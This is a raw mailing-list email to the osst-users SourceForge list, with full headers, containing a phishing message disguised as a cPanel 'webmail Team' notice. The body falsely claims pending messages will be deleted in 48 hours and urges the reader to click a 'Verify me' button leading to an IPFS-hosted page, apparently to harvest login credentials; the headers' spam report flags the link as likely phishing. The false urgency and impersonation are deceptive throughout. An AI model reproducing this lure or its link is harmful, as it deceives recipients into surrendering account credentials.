Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id D784F8B4F51
	for <lists+osst-users@lfdr.de>; Mon, 29 Apr 2024 03:52:52 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1s1GCJ-0003Bt-9N
	for lists+osst-users@lfdr.de;
	Mon, 29 Apr 2024 01:52:51 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <lexi@reichspiele.com>) id 1s1GCF-0003Bn-7C
 for osst-users@lists.sourceforge.net; Mon, 29 Apr 2024 01:52:47 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=EP0ja2mdeKujAfnn3ARXUaPucWV7y6hEK91UE0izG1Y=; b=OFJmv5qSHrWXiEg1svYeodfOzB
 ehUB0D8dTF8sqU6OL1fc5Mug+uihYQT2oKPAgDHNWn3aB+nPJMu1ISH6bwhQ/0YCj6uqF1EV1QlDL
 xVJ8AgGBeDGGAxbrLItVUCk8CYHdRYBnb9kZ4nDb5kEYFTNKRpQI403XSZ8z+IKKiJ/s=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=EP0ja2mdeKujAfnn3ARXUaPucWV7y6hEK91UE0izG1Y=; b=a
 wcWtLpaOkW1gmDI4FMmqGZtOltO4ziXX4hkSyguga1ivuzuqdGjaeE2v7Zo9qrPtZeDtJpMlcUlvn
 5Um7XdDl5xe9Z0yPyJ1ZBchfokk/ej8GVpPgpnJGsJhhxApwJI5YblXELWiNpLD7K/lLa/mLnm3aL
 M1Pi6VMpTCXi7qwI=;
Received: from howdy.reichspiele.com ([194.169.172.52])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1s1GCE-00085V-30 for osst-users@lists.sourceforge.net;
 Mon, 29 Apr 2024 01:52:47 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=reichspiele.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=lexi@reichspiele.com; bh=l1SNY0T4MNGsEYZAiA3lxF++QNk=;
 b=QFLMucv0rAsfD0bRVItCymOQ9kwyQ9lkUiPEjzIuPCLFBkoVk/zxD0OK8KM8MsvYMFk+vXK5nMub
 XcprrAdO7MB919sV4ZO814aQaR8lQm1jG4QQ2y2PcQe1n3kF9d7JNpQM8fA3QViiRbMc55yC4+ys
 3tRvpPmk8H9EWLNGe59JyQBLzJqJrKXTqUTi6C4QI1PjBqCgtC2cdueaGBaPO2zXlqNtHnsBGeFK
 +A78AZMkONo1vmNYjEwgQIcTqiYfoYuir+9afyYlD+LJPIPUjBBhArxuA54/35tI8JDa3qRUTYco
 U3QWiSbyENhqJLW2KRyGcmOQkizXJpHFqnGo2g==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=reichspiele.com;
 b=BNAwR2t6wkvZz38gcRp1QYdCdePrK1XtoT03RZoqnb088yoXkLSifkF1oy1KnYXIEIrWWRH33//p
 51JLbE1eNFhyso2s30F0ca/fP1NA7Vwio45RejjRgiGOxEyQUpS4MTud1hMdpLJ0sL6nq76InyPz
 6pkvU+kq7PMHpfvtpr80yK4pU9hOW5U+tmFxTzYxNmcjo7LLZV49gDCcrq6sGEwQ7jHPdnrIFe5B
 pLagjeILb0GJJ8QBTXPcQIW0Kbxkmy1/1DVoQMxyD30Im+W7Qz8pdz4dACREv0F9DZtR7CD+LLI+
 xYxE820q7rMjMx1qYaDKHjKWSB6g5EKx01Rbgw==;
From: Hostdomain<lexi@reichspiele.com>
To: osst-users@lists.sourceforge.net
Date: 28 Apr 2024 18:52:33 -0700
Message-ID: <20240428185233.E62C58CDB20DF76C@reichspiele.com>
MIME-Version: 1.0
X-Spam-Score: 3.1 (+++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Your incoming messages have been placed on hold. This pending
 messages will be deleted automatically after 48hours We need to verify your
 osst-users@lists.sourceforge.net address on our platform Click the Verify
 me below to move the pending e mails to your inbox. 
 Content analysis details:   (3.1 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: cloudflare-ipfs.com]
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [194.169.172.52 listed in dnsbl-1.uceprotect.net]
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [194.169.172.52 listed in bl.score.senderscore.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.9 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
 content via CloudFlare, likely phishing
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
X-Headers-End: 1s1GCE-00085V-30
Subject: [Osst-users] Signin For Pending e-mails!!!
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5982488253107879440=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============5982488253107879440==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<div style=3D'text-align: left; color: rgb(29, 34, 40); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: "Helvetica Neue",=
 Helvetica, Arial, sans-serif; font-size: 13px; font-style: normal; font-we=
ight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; b=
ackground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial;=20
text-decoration-color: initial;'><span style=3D"color: rgb(44, 54, 58); fon=
t-family: Arial, sans-serif;">Your incoming messages have been placed on ho=
ld.</span><br></div>
<div class=3D"yiv8484131672v1ydpe41a34dcyahoo_quoted" id=3D"yiv8484131672v1=
ydpe41a34dcyahoo_quoted_8180004419" style=3D'text-align: left; color: rgb(2=
9, 34, 40); text-transform: none; text-indent: 0px; letter-spacing: normal;=
 font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13=
px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: n=
ormal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-va=
riant-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;'>
<div style=3D'color: rgb(38, 40, 42); font-family: "Helvetica Neue", Helvet=
ica, Arial, sans-serif; font-size: 13px;'>
<div>
<div class=3D"yiv8484131672v1ydpfb2a13d5yahoo-style-wrap" style=3D'font-fam=
ily: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 13px;'>
<div id=3D"yiv8484131672v1ydpfb2a13d5yiv9234107129">
<div class=3D"yiv8484131672v1ydpfb2a13d5yiv9234107129ydpa75581bayahoo-style=
-wrap" style=3D'font-family: "Helvetica Neue", Helvetica, Arial, sans-serif=
; font-size: 13px;'>
<div dir=3D"ltr">
<div style=3D"color: rgb(44, 54, 58); padding-top: 0px; font-family: Arial,=
 sans-serif; border-top-color: currentColor; border-top-width: 0px; border-=
top-style: none;" dir=3D"ltr">
<div>
<div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;">This=
 pending messages will be deleted automatically after&nbsp;48hours<br><br>
<p align=3D"left" style=3D'margin: 20px 0px; padding: 0px; color: rgb(34, 3=
4, 34); line-height: 1.3; font-family: "Helvetica Neue", Helvetica, Arial, =
Geneva, sans-serif; font-size: 14px; background-color: rgb(240, 240, 240);'=
>
We need to verify your &nbsp;osst-users@lists.sourceforge.net &nbsp;address=
 on our&nbsp; platform<br>Click the Verify me&nbsp;below to move the pendin=
g&nbsp;e mails to your inbox.</p>
<table style=3D'padding: 0px; width: 150px; color: rgb(34, 34, 34); font-fa=
mily: "Helvetica Neue", Helvetica, Arial, Geneva, sans-serif; font-size: 14=
px; vertical-align: top; border-collapse: collapse; background-color: rgb(2=
40, 240, 240);'>
<tbody>
<tr align=3D"left" style=3D"padding: 0px; vertical-align: top;">
<td width=3D"150" height=3D"35" align=3D"center" valign=3D"middle" style=3D=
"background: rgb(108, 199, 39); padding: 0px; width: 150px; text-align: cen=
ter; color: rgb(255, 255, 255); line-height: 1.3; vertical-align: middle; d=
isplay: block; border-collapse: collapse; -ms-word-break: normal;" bgcolor=
=3D"#6cc727">
<a style=3D"border-width: 0px; margin: 0px; padding: 0px; width: 150px; col=
or: rgb(255, 255, 255); line-height: 35px; font-family: inherit; font-size:=
 18px; text-decoration: underline; vertical-align: baseline; display: inlin=
e-block; font-stretch: inherit; background-color: transparent;" href=3D"htt=
ps://cloudflare-ipfs.com/ipfs/bafybeicy4oxogpgwrbsxy3hqvks5jarzfhyoi4gf5pl6=
swsbtfudqcb32u/gtcxopjn.html/#osst-users@lists.sourceforge.net" target=3D"_=
blank" rel=3D"nofollow noopener noreferrer">&#10003; Verify me</a></td></tr=
>
</tbody>
</table></div>
<p style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif; margin-=
top: 0px;"><span style=3D"font-weight: bolder;"><br></span></p>
<div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;">
<div style=3D"padding-top: 0px; border-top-color: currentColor; border-top-=
width: 0px; border-top-style: none;">&nbsp;</div>
<div style=3D"margin: 0px; padding: 0px; font-family: arial, helvetica, san=
s-serif; font-size: small; border-top-width: 0px;">
<table style=3D"border-width: 0px; width: 872px; line-height: normal; font-=
family: verdana, arial, sans-serif; font-size: 11px; border-collapse: colla=
pse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<thead>
<tr>
<th style=3D"margin: 0px; padding: 4px 6px; width: 188px; text-align: left;=
 font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
0, 170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; bord=
er-left-width: 1px; border-top-style: solid; border-left-style: solid; back=
ground-color: rgb(251, 251, 251);">&nbsp;</th>
<th style=3D"margin: 0px; padding: 4px 6px; width: 229px; text-align: left;=
 font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
0, 170); border-left-color: rgb(170, 170, 170); border-top-width: 1px; bord=
er-left-width: 1px; border-top-style: solid; border-left-style: solid; back=
ground-color: rgb(251, 251, 251);">Recipient:</th>
<th style=3D"margin: 0px; padding: 4px 6px; width: 215px; text-align: left;=
 font-weight: normal; vertical-align: bottom; border-top-color: rgb(170, 17=
0, 170); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170=
, 170, 170); border-top-width: 1px; border-right-width: 1px; border-left-wi=
dth: 1px; border-top-style: solid; border-right-style: solid; border-left-s=
tyle: solid; background-color: rgb(251, 251, 251);">
<table style=3D"width: 203px; border-collapse: collapse;" border=3D"1">
<tbody>
<tr>
<td style=3D"width: 199px; -ms-word-break: normal;">Subject:</td></tr></tbo=
dy></table></th></tr></thead>
<thead>
<tr>
<th style=3D"margin: 0px; padding: 4px; width: 871px; text-align: left; col=
or: rgb(255, 255, 255); font-weight: normal; background-color: rgb(0, 0, 10=
0);" colspan=3D"4"><span style=3D"font-weight: bolder;">
<br></span></th></tr></thead>
<tbody>
<tr valign=3D"top">
<td style=3D"padding: 5px; width: 188px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
ce: nowrap; -ms-word-break: normal;"><span style=3D"color: rgb(60, 149, 195=
);"><strong><u>
</u></strong><font color=3D"#2c363a">Deliver</font><br></span></td>
<td style=3D"padding: 5px; width: 229px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
break: normal;">&nbsp; osst-users@lists.sourceforge.net&nbsp;</td>
<td style=3D"padding: 5px; width: 215px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
break: normal;"><font color=3D"#1560bd">Re: quotation</font></td>
<td style=3D"padding: 5px; width: 237px; border-top-color: rgb(170, 170, 17=
0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
1px; border-top-style: solid; border-right-style: solid; border-left-style:=
 solid; white-space: nowrap; -ms-word-break: normal;">
<span><strong>(26 April</strong><strong>&nbsp;2024)</strong></span></td></t=
r>
<tr valign=3D"top">
<td style=3D"padding: 5px; width: 188px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
ce: nowrap; -ms-word-break: normal;">
Deliver</td>
<td style=3D"padding: 5px; width: 229px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
break: normal;">&nbsp; osst-users@lists.sourceforge.net&nbsp;&nbsp;</td>
<td style=3D"padding: 5px; width: 215px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
break: normal;"><span style=3D"color: rgb(21, 96, 189);">

Re: Purchase Order</span></td>
<td style=3D"padding: 5px; width: 237px; border-top-color: rgb(170, 170, 17=
0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
1px; border-top-style: solid; border-right-style: solid; border-left-style:=
 solid; white-space: nowrap; -ms-word-break: normal;"><span><span><span><sp=
an><span><strong>(26 April</strong><strong>&nbsp;2024)</strong></span></spa=
n></span></span></span></td></tr>
<tr valign=3D"top">
<td style=3D"padding: 5px; width: 188px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
ce: nowrap; -ms-word-break: normal;">
Deliver</td>
<td style=3D"padding: 5px; width: 229px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
break: normal;">&nbsp; osst-users@lists.sourceforge.net&nbsp;&nbsp;</td>
<td style=3D"padding: 5px; width: 215px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
break: normal;"><strong>
</strong><font color=3D"#1560bd">Re: Proforma invoice</font></td>
<td style=3D"padding: 5px; width: 237px; border-top-color: rgb(170, 170, 17=
0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
1px; border-top-style: solid; border-right-style: solid; border-left-style:=
 solid; white-space: nowrap; -ms-word-break: normal;"><span><span><span><st=
rong>(26 April</strong><strong>&nbsp;2024)</strong></span></span></span></t=
d></tr>
<tr valign=3D"top">
<td style=3D"padding: 5px; width: 188px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; white-spa=
ce: nowrap; -ms-word-break: normal;">
Deliver</td>
<td style=3D"padding: 5px; width: 229px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
break: normal;">&nbsp; osst-users@lists.sourceforge.net&nbsp;&nbsp;</td>
<td style=3D"padding: 5px; width: 215px; border-top-color: rgb(170, 170, 17=
0); border-left-color: rgb(170, 170, 170); border-top-width: 1px; border-le=
ft-width: 1px; border-top-style: solid; border-left-style: solid; -ms-word-=
break: normal;"><span style=3D"color: rgb(95, 158, 160);">
<span style=3D"color: rgb(0, 71, 171);"><strong><u>
</u></strong><font color=3D"#1560bd">Re: Payment copy</font></span></span><=
/td>
<td style=3D"padding: 5px; width: 237px; border-top-color: rgb(170, 170, 17=
0); border-right-color: rgb(170, 170, 170); border-left-color: rgb(170, 170=
, 170); border-top-width: 1px; border-right-width: 1px; border-left-width: =
1px; border-top-style: solid; border-right-style: solid; border-left-style:=
 solid; white-space: nowrap; -ms-word-break: normal;"><span><span><span><st=
rong>(26 April</strong><strong>&nbsp;2024)</strong></span></span></span></t=
d></tr></tbody></table></div>
<div style=3D"margin: 0px; padding: 0px; border-top-width: 0px; display: in=
line;"><span style=3D"color: rgb(255, 0, 0); font-family: arial; font-size:=
 12px; font-weight: bolder;">
<span style=3D"color: rgb(34, 34, 34);"><br style=3D"font-family: arial, he=
lvetica, sans-serif;">&nbsp;</span></span></div>
&nbsp;&nbsp;<span style=3D"color: rgb(255, 0, 0); font-family: arial; font-=
size: 12px; font-weight: bolder;"><span style=3D"color: rgb(85, 85, 85);"><=
span>&nbsp;</span>Note : This message was sent by&nbsp;</span>
&nbsp;<span style=3D"color: rgb(192, 64, 0);">cPanel</span><span style=3D"c=
olor: rgb(85, 85, 85);">&nbsp;notification only.</span>&nbsp;Please do not =
reply<br>
<br style=3D'color: rgb(51, 51, 51); font-family: "times new roman"; font-s=
ize: medium;'>Regards<br>
lists.sourceforge.net&nbsp;<span style=3D"color: rgb(192, 64, 0);">&nbsp;we=
bmail</span>&nbsp;Team</span></div>
<div style=3D"color: rgb(44, 54, 58); font-family: Arial, sans-serif;"><spa=
n style=3D"color: rgb(255, 0, 0); font-family: arial; font-size: 12px; font=
-weight: bolder;">
<span style=3D'color: rgb(51, 51, 51); font-family: "lucida grande", verdan=
a, arial, helvetica, sans-serif; font-size: 11px;'>&#9400; 2023&nbsp;<span =
style=3D"font-weight: bolder;">
&nbsp;<span style=3D"color: rgb(192, 64, 0); font-family: arial; font-size:=
 16px;">cPanel</span></span><span>&nbsp;</span>&nbsp;&nbsp;<span style=3D"c=
olor: rgb(77, 81, 86); font-family: arial, sans-serif; font-size: 14px; fon=
t-weight: 400;">
<span style=3D"color: rgb(192, 64, 0); font-size: 11px;">&reg;</span></span=
>&nbsp;&nbsp;. All Rights Reserved.</span></span></div></div></div></div></=
div></div></div></div></div></div></body></html>


--===============5982488253107879440==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5982488253107879440==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============5982488253107879440==--
